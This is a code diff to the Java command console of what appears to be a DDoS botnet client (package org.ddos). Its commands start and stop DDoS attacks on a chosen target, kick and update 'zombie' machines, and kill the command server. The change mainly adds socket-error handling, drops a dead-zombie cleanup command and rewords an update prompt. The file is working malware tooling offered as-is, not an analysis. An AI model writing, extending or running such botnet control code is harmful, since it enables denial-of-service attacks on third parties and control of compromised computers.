@@ -7,11 +7,13 @@ import java.io.InputStreamReader;
 import java.io.Serializable;
 import java.net.InetSocketAddress;
 import java.net.SocketAddress;
+import java.net.SocketException;
 import java.util.ArrayList;
 import java.util.Arrays;
 import java.util.regex.Pattern;
 
 import org.ddos.client.DOS;
+import org.ddos.client.Exceptions;
 import org.ddos.network.ClientNetwork;
 import org.ddos.updater.Updater;
 import org.ddos.util.Computer;
@@ -25,21 +27,6 @@ import org.jnetwork.Connection;
 import org.jnetwork.DataPackage;
 
 public class CommandActions {
-	public static CommandJob getRemoveDeadZombiesAction() {
-		return new CommandJob() {
-			@Override
-			public Object doJob(Command command) {
-				try {
-					ClientNetwork.getClient().getOutputStream()
-							.writeObject(new DataPackage().setMessage("REMOVE_DEAD_ZOMBIES"));
-				} catch (IOException e) {
-					e.printStackTrace();
-				}
-				return null;
-			}
-		};
-	}
-
 	public static CommandJob getDdosAction() {
 		return new CommandJob() {
 			@Override
@@ -69,12 +56,15 @@ public class CommandActions {
 								.writeObject(new DataPackage(command.getCommandArguments()[1]).setMessage("STOP_DDOS"));
 						System.out.println("Stopped DDoS attack on " + command.getCommandArguments()[1] + ".");
 					}
+				} catch (SocketException e) {
+					Exceptions.unconnectedException();
 				} catch (IOException e) {
 					e.printStackTrace();
 				}
 				return null;
 			}
 		};
+
 	}
 
 	public static CommandJob getKickAction() {
@@ -92,6 +82,8 @@ public class CommandActions {
 							.writeObject(new DataPackage(
 									(Serializable[]) addresses.toArray(new SocketAddress[addresses.size()]))
 											.setMessage("KICK_ZOMBIES"));
+				} catch (SocketException e) {
+					Exceptions.unconnectedException();
 				} catch (IOException e) {
 					e.printStackTrace();
 				}
@@ -129,6 +121,8 @@ public class CommandActions {
 					}
 
 					return addresses.length;
+				} catch (SocketException e) {
+					Exceptions.unconnectedException();
 				} catch (IOException e) {
 					e.printStackTrace();
 				} catch (ClassNotFoundException e) {
@@ -214,6 +208,8 @@ public class CommandActions {
 					} catch (InterruptedException e) {
 						e.printStackTrace();
 					}
+				} catch (SocketException e) {
+					Exceptions.unconnectedException();
 				} catch (IOException e) {
 					e.printStackTrace();
 				}
@@ -350,6 +346,8 @@ public class CommandActions {
 					while (true) {
 						System.out.println(ClientNetwork.getClient().getInputStream().readObject());
 					}
+				} catch (SocketException e) {
+					Exceptions.unconnectedException();
 				} catch (Exception e) {
 					e.printStackTrace();
 				}
@@ -370,6 +368,8 @@ public class CommandActions {
 						System.out.println(((DataPackage) ClientNetwork.getClient().getInputStream().readObject())
 								.getObjects()[0]);
 					}
+				} catch (SocketException e) {
+					Exceptions.unconnectedException();
 				} catch (Exception e) {
 					e.printStackTrace();
 				}
@@ -385,6 +385,8 @@ public class CommandActions {
 				try {
 					ClientNetwork.getClient().getOutputStream()
 							.writeObject(new DataPackage().setMessage("KILL_SERVER"));
+				} catch (SocketException e) {
+					Exceptions.unconnectedException();
 				} catch (IOException e) {
 					e.printStackTrace();
 				}
@@ -397,7 +399,7 @@ public class CommandActions {
 		return new CommandJob() {
 			@Override
 			public Object doJob(Command command) {
-				System.out.print("Are you sure you want to perform update? (Y/N): ");
+				System.out.print("Are you sure you want to perform an update on the chosen target's machine? (Y/N): ");
 				if (!Console.input.nextLine().toLowerCase().trim().equals("y")) {
 					System.out.println("Aborting update.");
 					return null;
@@ -428,6 +430,8 @@ public class CommandActions {
 								new DataPackage(new InetSocketAddress(split[0], Integer.parseInt(split[1])))
 										.setMessage("UPDATE_ZOMBIE"));
 					}
+				} catch (SocketException e) {
+					Exceptions.unconnectedException();
 				} catch (IOException e) {
 					e.printStackTrace();
 				}
@@ -452,6 +456,8 @@ public class CommandActions {
 				if (ClientNetwork.getClient() != null) {
 					try {
 						ClientNetwork.getClient().close();
+					} catch (SocketException e) {
+						Exceptions.unconnectedException();
 					} catch (IOException e) {
 						e.printStackTrace();
 					}
@@ -459,6 +465,8 @@ public class CommandActions {
 				try {
 					String[] split = command.getCommandArguments()[0].split(Pattern.quote(":"));
 					ClientNetwork.setClient(new Connection(split[0], Integer.parseInt(split[1])));
+				} catch (SocketException e) {
+					Exceptions.unconnectedException();
 				} catch (IOException e) {
 					e.printStackTrace();
 				}
@@ -476,6 +484,8 @@ public class CommandActions {
 				try {
 					ClientNetwork.getClient().close();
 					ClientNetwork.setClient(null);
+				} catch (SocketException e) {
+					Exceptions.unconnectedException();
 				} catch (Exception e) {
 					return null;
 				}
